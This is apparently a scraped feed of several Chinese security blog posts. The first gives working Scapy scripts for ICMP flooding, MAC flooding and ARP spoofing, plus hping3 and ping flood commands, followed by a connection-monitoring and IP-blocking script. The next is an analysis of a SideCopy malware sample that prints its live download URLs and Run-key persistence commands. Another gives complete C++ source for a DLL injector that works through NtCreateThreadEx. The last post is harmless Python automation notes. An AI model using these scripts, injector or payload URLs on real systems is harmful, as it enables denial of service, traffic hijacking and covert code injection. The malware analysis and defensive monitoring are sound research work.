ICMP泛洪 1234567# ICMP 泛洪 可以伪造src发包给target_ip,从而导致伪造的src主机全都发包给target_ip,即为反射攻击def icmp_flood(target_ip): while True: payload = &quot;HHHHHHHHHHHHHHHHHHH&quot; pkg = IP(dst=target_ip) / ICMP() / payload send(pkg, verbose=False) ICMP 广播风暴 123456# 广播风暴def icmp_broadcast(): while True: payload = &quot;HHHHHHHHHHHHHHHHHHH&quot; pkg = IP(dst=&quot;192.168.101.255&quot;) / ICMP() / payload send(pkg, verbose=False) ping命令 设置间隔很小 设置数据包很大 12ping -i 0.001 -s 2000 target_ipping -f target_ip MAC地址泛洪 定义随机MAC地址，不停的发送该条数据，交换机发现MAC表不存在，将其添加到MAC表中，从而填满MAC表，导致新的数据包无法添加到MAC表，只能广播或者交换机崩溃 ​ 工具 ： macof 用于对交换机进行mac地址表溢出 sudo apt install dsniff 12345678910# MAC地址泛洪def mac_flood(): while True: random_smac = RandMAC(&quot;*:*:*:*:*:*&quot;) random_dmac = RandMAC(&quot;*:*:*:*:*:*&quot;) random_src_ip = RandIP() random_dst_ip = RandIP() pkg = Ether(src=random_smac, dst=random_dmac) / IP(src=random_src_ip, dst=random_dst_ip) send(pkg, iface=&quot;&quot;, loop=0) 虚拟机 默认使用混杂模式，可以监控到其他主机的流量 arp 攻击 工具： arpspoof 原理 ： 发送arp请求，告诉被攻击主机，网关的MAC地址是我的MAC地址，使得流量转发到攻击主机。 1234567891011kali 攻击主机：192.168.198.128 ether 00:0c:29:c8:79:86 被攻击主机win7: 192.168.198.133 00:0c:29:ff:57:a0网关： 192.168.198.2 00:50:56:e1:2d:09# -i 网卡 -t target_ip fake_iparpspoof -i eth0 -t 192.168.198.133 192.168.198.20:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:860:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:860:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:860:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86 win7 主机 MAC 表 如看已经欺骗成功，win7 上网失败 停止攻击后： arp 欺骗只需要多一步： 打开kali 的流量转发功能，这样win7 就可以正常上网，但是流量相当于被劫持了，从kali 走了一道，流量被监控 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 1234567891011121314151617# python实现# 告诉被攻击主机我是网关，告诉网关，我是被攻击主机def arp_flood(): while True: target_ip = &#x27;192.168.198.133&#x27; target_MAC = &#x27;00:0c:29:ff:57:a0&#x27; gateway_ip = &#x27;192.168.198.2&#x27; gateway_MAC = &#x27;00:50:56:e1:2d:09&#x27; kali_MAC = &#x27;00:0c:29:c8:79:86&#x27; # 发送给被攻击主机 # op=2 代表响应 op=1 ARP请求 pkg_target = Ether(src=kali_MAC, dst=target_MAC) / ARP(psrc=gateway_ip, pdst=target_ip, hwsrc=kali_MAC,hwdst=target_MAC,op=2) send(pkg_target, iface=&quot;eth0&quot;) # 发送给网关 pkg_gateway = Ether(src=kali_MAC, dst=gateway_MAC) / ARP(psrc=target_ip, pdst=gateway_ip, hwsrc=kali_MAC,hwdst=gateway_MAC,op=2) send(pkg_gateway, iface=&quot;eth0&quot;) time.sleep(1) hping3 泛洪攻击工具（还是多厉害） 1hping3 --flood -S --rand-source -p 端口 目标IP web站点压力测试工具 ab wrk 等 netstat -s 可以查看数据包统计情况 7、泛洪攻击的防御相关 12345678910# 检查 网络连接的数量netstat -ant |wc -l 判断连接是否一直在增加netstat -ant |grep SYN_RECV 半连接的数量netstat -s |grep overflowed 可以检查是否出现全连接队列溢出的情况，连接队列溢出会导致无法与服务器建立新连接或者客户端出现大量 connection reset by peer 错误。netstat -s |grep dropped 半连接队列溢出的情况top -n 1 只刷新一次就退出，可看出消耗CPU较大的进程uptime 显示当前时间，运行时间，用户，1分钟，5分钟，15分钟的平均负载# 修改系统配置参数，增加TCP连接数量# 结束消耗CPU的进程或者服务# 防火墙封禁IP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114# 检测当前环境是否正在遭受攻击import osimport time# 判断当前连接数量是否一直在增加 netstat -ant |wc -ldef connect_add_pers(): command = &#x27;netstat -ant |wc -l&#x27; start = time.time() count_start = int(os.popen(command).read()) while True: end = time.time() count_end = int(os.popen(command).read()) if end - start &gt; 1: add_connect = count_end - count_start break # if add_connect &gt; 1000: # return add_connect return add_connect# netstat -ant |grep SYN_RECV 半连接的数量def half_connect(): command = &#x27;netstat -ant |grep SYN_RECV|wc -l&#x27; count = int(os.popen(command).read()) return count# 半连接队列溢出的情况# 4839240 SYNs to LISTEN sockets droppeddef dropped_half_connect(): command = &quot;netstat -s |grep &#x27;SYNs to LISTEN sockets dropped&#x27; |awk &#x27;&#123;print $1&#125;&#x27;&quot; count = int(os.popen(command).read()) return count# 全连接队列溢出的情况# 809 times the listen queue of a socket overfloweddef dropped_full_connect(): command = &quot;netstat -s |grep &#x27;times the listen queue of a socket overflowed&#x27; |awk &#x27;&#123;print $1&#125;&#x27;&quot; count = int(os.popen(command).read()) return count# 找到CPU占用最高的进程def top_1_process(): command = (&quot;top -n 1 |head -n 8|tail -n 1 |awk &#x27;&#123;print $2&#125;&#x27; |while read line;do ps -aux |grep $line |head -n 1 &quot; &quot;|awk &#x27;&#123;print $11&#125;&#x27;;done&quot;) process = os.popen(command).read().strip() return process# 获取每个主机连接到本机的连接数，找到最多的IP，denydef get_socket_connect(): count_command = &quot;netstat -ntu | awk &#x27;&#123;print $5&#125;&#x27; | cut -d: -f1 | sort | uniq -c | sort -n |tail -n 1 |awk &#x27;&#123;print $1&#125;&#x27;&quot; count_max_socket = int(os.popen(count_command).read()) if count_max_socket &gt; 100: command = &quot;netstat -ntu | awk &#x27;&#123;print $5&#125;&#x27; | cut -d: -f1 | sort | uniq -c | sort -n |tail -n 1 |awk &#x27;&#123;print $2&#125;&#x27;&quot; ip = os.popen(command).read().strip() print(f&quot;&#123;ip&#125; 连接数为&#123;count_max_socket&#125; ,需要封禁，开始封禁&quot;) rule = f&#x27;rule family=&quot;ipv4&quot; source address=&quot;&#123;ip&#125;&quot; reject&#x27; all_rules = os.popen(&quot;firewall-cmd --reload &amp;&amp; firewall-cmd --list-all&quot;).read() time.sleep(2) if rule in all_rules: print(f&quot;&#123;rule&#125; 已存在&quot;) return reject_cmd = f&quot;firewall-cmd --add-rich-rule=&#x27;&#123;rule&#125;&#x27; --permanent&quot; # print(reject_cmd) reload_cmd = &quot;firewall-cmd --reload&quot; # print(reload_cmd) result1 = os.popen(reject_cmd).read().strip() time.sleep(1) result2 = os.popen(reload_cmd).read().strip() time.sleep(1) if result1 == &#x27;success&#x27; and result2 == &#x27;success&#x27;: print(&quot;封禁完成&quot;) else: print(&quot;封禁失败，请检查&quot;)# uptime 1分钟、5分钟、15分钟内的负载信息# 如果1分钟的cpu大于50，代表可能遭遇了攻击def get_cpuload_by_uptime(): result = os.popen(&#x27;uptime&#x27;).read().strip() result = result.replace(&#x27;: &#x27;, &quot;,&quot;) result_list = result.split(&quot;,&quot;) cpu_1_avg = float(result_list[-3]) # cpu_5_avg = float(result_list[-2]) # cpu_15_avg = float(result_list[-1]) return cpu_1_avg# 采集netstat -ant 的连接数量# 如果连接大于500 代表可能遭遇了攻击def get_conn_count_by_netstat(): command = &#x27;netstat -ant |wc -l&#x27; count = int(os.popen(command).read().strip()) return countif __name__ == &quot;__main__&quot;: # print(f&quot;当前每秒钟连接增加数量为&#123;connect_add_pers()&#125;&quot;) # print(f&quot;当前网络中存在的半连接数量为&#123;half_connect()&#125;&quot;) # print(f&quot;当前网络中半连接溢出数量为&#123;dropped_half_connect()&#125;&quot;) # print(f&quot;当前网络中全连接溢出数量为&#123;dropped_full_connect()&#125;&quot;) # print(f&quot;当前系统中占用CPU最高的进程为&#123;top_1_process()&#125;&quot;) # while True: # get_socket_connect() while True: print(f&quot;CPU-Load: &#123;get_cpuload_by_uptime()&#125;,conn-count: &#123;get_conn_count_by_netstat()&#125;&quot;)","categories":[{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/tags/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"}]},{"title":"SideCioy 典型压缩包样本分析","slug":"逆向/SideCioy 典型压缩包样本分析","date":"2023-10-30T16:00:00.000Z","updated":"2024-03-12T15:21:50.771Z","comments":true,"path":"2023/10/31/逆向/SideCioy 典型压缩包样本分析/","link":"","permalink":"http://zwjsfdbb.top/2023/10/31/%E9%80%86%E5%90%91/SideCioy%20%E5%85%B8%E5%9E%8B%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","excerpt":"1、 样本基本信息 压缩包，解压后是一个伪装成PDF的lnk文件，另外还有个隐藏目录，里面有一个加密的文件 desktop.otp，功能未知 2、lnk文件解析 010editor 查看lnk文件 下载得到一个hta文件，包含很多javascript代码 可用IE来调试，根据IE的调试，整理代码得到以下结果 但是IE调试很不方便，把以上代码改编成C# 的代码来调试，保存中间文件output.bin ，里面包含一个DLL 文件（preBotHta.dll ）","text":"1、 样本基本信息 压缩包，解压后是一个伪装成PDF的lnk文件，另外还有个隐藏目录，里面有一个加密的文件 desktop.otp，功能未知 2、lnk文件解析 010editor 查看lnk文件 下载得到一个hta文件，包含很多javascript代码 可用IE来调试，根据IE的调试，整理代码得到以下结果 但是IE调试很不方便，把以上代码改编成C# 的代码来调试，保存中间文件output.bin ，里面包含一个DLL 文件（preBotHta.dll ） 另外写一个C# 动态加载DLL的代码，如下，即可调试。 不断跟进 总结该DLL的功能： 首先检查AV， 检查后回传URL “https://sunfireglobal.in/public/assests/files/auth/av“ anvaro&#x3D;%AV% 创建诱饵PDF 并打开 删除以前的版本 获取第三阶段的文件 12345文件1url &quot;https://sunfireglobal.in/public/assests/files/auth/dl&quot; -&gt;C:\\\\Users\\\\Public\\\\aque\\\\DUser.dll文件2 https://sunfireglobal.in/public/assests/files/auth/ht -&gt; C:\\Users\\Public\\aque\\up.hta 拷贝系统目录的credwiz.exe”到 “C:\\Users\\Public\\aque\\cdrzip.exe 创建lnk文件 放到启动目录 123456vnim.lnk cmd /c start /b C:\\Users\\Public\\aque\\cdrzip.exeonim.lnk cmd /c start /b C:\\Users\\Public\\aque\\up.hta 创建 %temp%\\test.bat” 并启动 后删除 12@echo offREG ADD &quot;HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /V &quot;Run01&quot; /t REG_SZ /F /D &quot;C:\\Users\\Public\\aque\\cdrzip.exe&quot; 创建 “C:\\Users\\Public\\aque\\bat.php; 并启动 后删除 12@echo offREG ADD &quot;HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /V &quot;Run02&quot; /t REG_SZ /F /D &quot;C:\\Users\\Public\\aque\\up.hta&quot; 两个DLL均无法下载，分析到此结束 附：DLL中解密函数 1234567891011121314import base64import gzipimport iodef decompressData(compressedText): array = base64.b64decode(compressedText) num = int.from_bytes(array[:4], byteorder=&#x27;little&#x27;) array2 = array[4:] with io.BytesIO(array2) as memoryStream: with gzip.GzipFile(fileobj=memoryStream, mode=&#x27;rb&#x27;) as gzipStream: array2 = gzipStream.read() return array2.decode(&#x27;utf-8&#x27;)","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"创建远程线程-NtCreateThreadEx","slug":"编程/创建远程线程","date":"2023-10-27T16:00:00.000Z","updated":"2024-03-12T10:43:39.477Z","comments":true,"path":"2023/10/28/编程/创建远程线程/","link":"","permalink":"http://zwjsfdbb.top/2023/10/28/%E7%BC%96%E7%A8%8B/%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/","excerpt":"创建远程线程的学习1.目标 ： 实现对普通进程，服务进程 32&#x2F;64位程序的通用注入 2、主要函数 NtCreateThreadEx 3、代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#pragma warning(disable: 4996)#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL IsVistaOrLater();BOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuff);BOOL InjectDll(DWORD dwPid, char* szDllName);int main(int argc,char*argv[])&#123; DWORD dwPid = (DWORD)atoi(argv[1]); char* szDllName = argv[2]; std::cout &lt;&lt; &quot;dwPid is &quot; &lt;&lt; dwPid &lt;&lt; std::endl; std::cout &lt;&lt; &quot;szDllName is &quot; &lt;&lt; szDllName &lt;&lt; std::endl; if (dwPid != 0 &amp;&amp; strlen(szDllName) &gt; 0) &#123; if (InjectDll(dwPid, szDllName)) &#123; printf(&quot;注入成功\\n&quot;); &#125; else &#123; printf(&quot;注入失败\\n&quot;); &#125; &#125; std::cout &lt;&lt; &quot;Hello World!\\n&quot;;&#125;#ifdef _WIN64typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)( OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);#elsetypedef DWORD(WINAPI* pfnNtCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID Unknown );#endif// 判断是否是win7 以后的版本BOOL IsVistaOrLater()&#123; OSVERSIONINFOEX os; ZeroMemory(&amp;os, sizeof(os)); os.dwOSVersionInfoSize = sizeof(os); // 此API已经被弃用 GetVersionEx((OSVERSIONINFO*)&amp;os); if (os.dwMajorVersion&gt;= 6) &#123; return TRUE; &#125; else &#123; return FALSE; &#125;&#125;BOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuff)&#123; HANDLE hThread = NULL; FARPROC pFunc = NULL; if (IsVistaOrLater()) &#123; HMODULE hNtdll = GetModuleHandle(L&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;GetModuleHandle ntdll.dll error&quot;); return FALSE; &#125; pFunc = GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;); if (pFunc == NULL) &#123; printf(&quot;GetProcAddress NtCreateThreadEx error&quot;); return FALSE; &#125; ((pfnNtCreateThreadEx)pFunc)(&amp;hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuff, FALSE,NULL, NULL, NULL, NULL); if (hThread == NULL) &#123; printf(&quot;NtCreateThreadEx error %d\\n&quot;, GetLastError()); system(&quot;pause&quot;); return FALSE; &#125; &#125; else &#123; hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuff, 0, NULL); if (hThread == NULL) &#123; printf(&quot;CreateRemoteThread error&quot;); return FALSE; &#125; &#125; if (WAIT_FAILED == WaitForSingleObject(hThread, INFINITE)) &#123; printf(&quot;WaitForSingleObject error&quot;); return FALSE; &#125; return TRUE;&#125;bool SetDebugPrivilege()&#123; HANDLE hToken; TOKEN_PRIVILEGES tokenPrivileges; LUID luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; std::cout &lt;&lt; &quot;Failed to open process token.&quot; &lt;&lt; std::endl; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid)) &#123; std::cout &lt;&lt; &quot;Failed to lookup privilege value.&quot; &lt;&lt; std::endl; CloseHandle(hToken); return false; &#125; tokenPrivileges.PrivilegeCount = 1; tokenPrivileges.Privileges[0].Luid = luid; tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; std::cout &lt;&lt; &quot;Failed to adjust token privileges.&quot; &lt;&lt; std::endl; CloseHandle(hToken); return false; &#125; CloseHandle(hToken); return true;&#125;BOOL InjectDll(DWORD dwPid, char* szDllName)&#123; HANDLE hProcess = NULL; LPVOID pRemotebuff = NULL; LPTHREAD_START_ROUTINE pThreadProc = NULL; SIZE_T dwBuffsize = strlen(szDllName) + 1; if (!SetDebugPrivilege()) &#123; printf(&quot;SetDebugPrivilege error %d\\n&quot;, GetLastError()); return FALSE; &#125; if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid))) &#123; printf(&quot;OpenPrcess error %d \\n&quot;,GetLastError()); return FALSE; &#125; pRemotebuff = VirtualAllocEx(hProcess, NULL, dwBuffsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pRemotebuff == NULL) &#123; printf(&quot;VirtualAllocEx error&quot;); return FALSE; &#125; //ZeroMemory(pRemotebuff, dwBuffsize); if (!WriteProcessMemory(hProcess, pRemotebuff, szDllName, dwBuffsize, NULL)) &#123; printf(&quot;WriteProcessMemory error&quot;); return FALSE; &#125; HMODULE hModule = GetModuleHandle(L&quot;Kernel32&quot;); if (hModule == NULL) &#123; printf(&quot;GetModuleHandle Kernel32.dll error&quot;); return FALSE; &#125; pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;LoadLibraryA&quot;); if (pThreadProc == NULL) &#123; printf(&quot;GetProcAddress LoadLibraryA error&quot;); return FALSE; &#125; if (!MyCreateRemoteThread(hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemotebuff)) &#123; printf(&quot;MyCreateRemoteThread error %d\\n&quot;,GetLastError()); return FALSE; &#125; VirtualFreeEx(hProcess, pRemotebuff, 0, MEM_RELEASE); CloseHandle(hProcess); return TRUE;&#125; 4、易错点 DLL全路径 NtCreateThreadEx 原型的定义 给进程SeDebug权限，","text":"创建远程线程的学习1.目标 ： 实现对普通进程，服务进程 32&#x2F;64位程序的通用注入 2、主要函数 NtCreateThreadEx 3、代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#pragma warning(disable: 4996)#include &lt;iostream&gt;#include &lt;Windows.h&gt;BOOL IsVistaOrLater();BOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuff);BOOL InjectDll(DWORD dwPid, char* szDllName);int main(int argc,char*argv[])&#123; DWORD dwPid = (DWORD)atoi(argv[1]); char* szDllName = argv[2]; std::cout &lt;&lt; &quot;dwPid is &quot; &lt;&lt; dwPid &lt;&lt; std::endl; std::cout &lt;&lt; &quot;szDllName is &quot; &lt;&lt; szDllName &lt;&lt; std::endl; if (dwPid != 0 &amp;&amp; strlen(szDllName) &gt; 0) &#123; if (InjectDll(dwPid, szDllName)) &#123; printf(&quot;注入成功\\n&quot;); &#125; else &#123; printf(&quot;注入失败\\n&quot;); &#125; &#125; std::cout &lt;&lt; &quot;Hello World!\\n&quot;;&#125;#ifdef _WIN64typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)( OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);#elsetypedef DWORD(WINAPI* pfnNtCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID Unknown );#endif// 判断是否是win7 以后的版本BOOL IsVistaOrLater()&#123; OSVERSIONINFOEX os; ZeroMemory(&amp;os, sizeof(os)); os.dwOSVersionInfoSize = sizeof(os); // 此API已经被弃用 GetVersionEx((OSVERSIONINFO*)&amp;os); if (os.dwMajorVersion&gt;= 6) &#123; return TRUE; &#125; else &#123; return FALSE; &#125;&#125;BOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuff)&#123; HANDLE hThread = NULL; FARPROC pFunc = NULL; if (IsVistaOrLater()) &#123; HMODULE hNtdll = GetModuleHandle(L&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;GetModuleHandle ntdll.dll error&quot;); return FALSE; &#125; pFunc = GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;); if (pFunc == NULL) &#123; printf(&quot;GetProcAddress NtCreateThreadEx error&quot;); return FALSE; &#125; ((pfnNtCreateThreadEx)pFunc)(&amp;hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuff, FALSE,NULL, NULL, NULL, NULL); if (hThread == NULL) &#123; printf(&quot;NtCreateThreadEx error %d\\n&quot;, GetLastError()); system(&quot;pause&quot;); return FALSE; &#125; &#125; else &#123; hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuff, 0, NULL); if (hThread == NULL) &#123; printf(&quot;CreateRemoteThread error&quot;); return FALSE; &#125; &#125; if (WAIT_FAILED == WaitForSingleObject(hThread, INFINITE)) &#123; printf(&quot;WaitForSingleObject error&quot;); return FALSE; &#125; return TRUE;&#125;bool SetDebugPrivilege()&#123; HANDLE hToken; TOKEN_PRIVILEGES tokenPrivileges; LUID luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; std::cout &lt;&lt; &quot;Failed to open process token.&quot; &lt;&lt; std::endl; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid)) &#123; std::cout &lt;&lt; &quot;Failed to lookup privilege value.&quot; &lt;&lt; std::endl; CloseHandle(hToken); return false; &#125; tokenPrivileges.PrivilegeCount = 1; tokenPrivileges.Privileges[0].Luid = luid; tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; std::cout &lt;&lt; &quot;Failed to adjust token privileges.&quot; &lt;&lt; std::endl; CloseHandle(hToken); return false; &#125; CloseHandle(hToken); return true;&#125;BOOL InjectDll(DWORD dwPid, char* szDllName)&#123; HANDLE hProcess = NULL; LPVOID pRemotebuff = NULL; LPTHREAD_START_ROUTINE pThreadProc = NULL; SIZE_T dwBuffsize = strlen(szDllName) + 1; if (!SetDebugPrivilege()) &#123; printf(&quot;SetDebugPrivilege error %d\\n&quot;, GetLastError()); return FALSE; &#125; if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid))) &#123; printf(&quot;OpenPrcess error %d \\n&quot;,GetLastError()); return FALSE; &#125; pRemotebuff = VirtualAllocEx(hProcess, NULL, dwBuffsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pRemotebuff == NULL) &#123; printf(&quot;VirtualAllocEx error&quot;); return FALSE; &#125; //ZeroMemory(pRemotebuff, dwBuffsize); if (!WriteProcessMemory(hProcess, pRemotebuff, szDllName, dwBuffsize, NULL)) &#123; printf(&quot;WriteProcessMemory error&quot;); return FALSE; &#125; HMODULE hModule = GetModuleHandle(L&quot;Kernel32&quot;); if (hModule == NULL) &#123; printf(&quot;GetModuleHandle Kernel32.dll error&quot;); return FALSE; &#125; pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;LoadLibraryA&quot;); if (pThreadProc == NULL) &#123; printf(&quot;GetProcAddress LoadLibraryA error&quot;); return FALSE; &#125; if (!MyCreateRemoteThread(hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemotebuff)) &#123; printf(&quot;MyCreateRemoteThread error %d\\n&quot;,GetLastError()); return FALSE; &#125; VirtualFreeEx(hProcess, pRemotebuff, 0, MEM_RELEASE); CloseHandle(hProcess); return TRUE;&#125; 4、易错点 DLL全路径 NtCreateThreadEx 原型的定义 给进程SeDebug权限，","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"Python补充学习","slug":"编程/python学习","date":"2023-10-16T16:00:00.000Z","updated":"2024-03-12T11:12:48.821Z","comments":true,"path":"2023/10/17/编程/python学习/","link":"","permalink":"http://zwjsfdbb.top/2023/10/17/%E7%BC%96%E7%A8%8B/python%E5%AD%A6%E4%B9%A0/","excerpt":"python 补充学习1、函数参数（可变长参数） 12345678910111213# 可变长参数 *args 代表可选参数，**kwargs 代表可选字典参数def test_args(a,b,*args,**kwargs): print(a+b) print(args) print(kwargs) return args,kwargs# Press the green button in the gutter to run the script.if __name__ == &#x27;__main__&#x27;: print_hi(&#x27;PyCharm&#x27;) test_args(10,20,&#x27;xxx&#x27;,&#x27;xx1&#x27;,name=&#x27;xx11&#x27;) 2、自动化操作 selenium 操作浏览器 12345678910111213 # 1 安装chromedriver.exe 参考 https://blog.csdn.net/qq_35462334/article/details/133806824 # 2 安装selenium pip install selenium from selenium import webdriverfrom selenium.webdriver.common.by import Bydriver = webdriver.Chrome()driver.get(&quot;http://www.woniunote.com/&quot;)# 可利用以下多个方法来定位元素# By.ID By.XPATH By.LINK_TEXT BY.PARTIAL_LINK_TEXT By.NAME BY.TAG_NAME BY.CLASS_NAME BY.CSS_SELECTORa_tag_list = driver.find_elements(By.XPATH, &#x27;//*[@id=&quot;loginmenu&quot;]&#x27;)driver.close() windows元素自动化 uiautomation 操作计算器 1234567891011# UIAutomation 识别windows元素 自动操控# 1、利用uispy 查看元素# 2、定位元素import uiautomationcalc = uiautomation.WindowControl(Name=&#x27;计算器&#x27;)calc.ButtonControl(AutomationId=&#x27;num1Button&#x27;).Click()calc.ButtonControl(AutomationId=&#x27;plusButton&#x27;).Click()calc.ButtonControl(Name=&#x27;三&#x27;).Click()calc.ButtonControl(AutomationId=&#x27;equalButton&#x27;).Click()","text":"python 补充学习1、函数参数（可变长参数） 12345678910111213# 可变长参数 *args 代表可选参数，**kwargs 代表可选字典参数def test_args(a,b,*args,**kwargs): print(a+b) print(args) print(kwargs) return args,kwargs# Press the green button in the gutter to run the script.if __name__ == &#x27;__main__&#x27;: print_hi(&#x27;PyCharm&#x27;) test_args(10,20,&#x27;xxx&#x27;,&#x27;xx1&#x27;,name=&#x27;xx11&#x27;) 2、自动化操作 selenium 操作浏览器 12345678910111213 # 1 安装chromedriver.exe 参考 https://blog.csdn.net/qq_35462334/article/details/133806824 # 2 安装selenium pip install selenium from selenium import webdriverfrom selenium.webdriver.common.by import Bydriver = webdriver.Chrome()driver.get(&quot;http://www.woniunote.com/&quot;)# 可利用以下多个方法来定位元素# By.ID By.XPATH By.LINK_TEXT BY.PARTIAL_LINK_TEXT By.NAME BY.TAG_NAME BY.CLASS_NAME BY.CSS_SELECTORa_tag_list = driver.find_elements(By.XPATH, &#x27;//*[@id=&quot;loginmenu&quot;]&#x27;)driver.close() windows元素自动化 uiautomation 操作计算器 1234567891011# UIAutomation 识别windows元素 自动操控# 1、利用uispy 查看元素# 2、定位元素import uiautomationcalc = uiautomation.WindowControl(Name=&#x27;计算器&#x27;)calc.ButtonControl(AutomationId=&#x27;num1Button&#x27;).Click()calc.ButtonControl(AutomationId=&#x27;plusButton&#x27;).Click()calc.ButtonControl(Name=&#x27;三&#x27;).Click()calc.ButtonControl(AutomationId=&#x27;equalButton&#x27;).Click()","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"OD 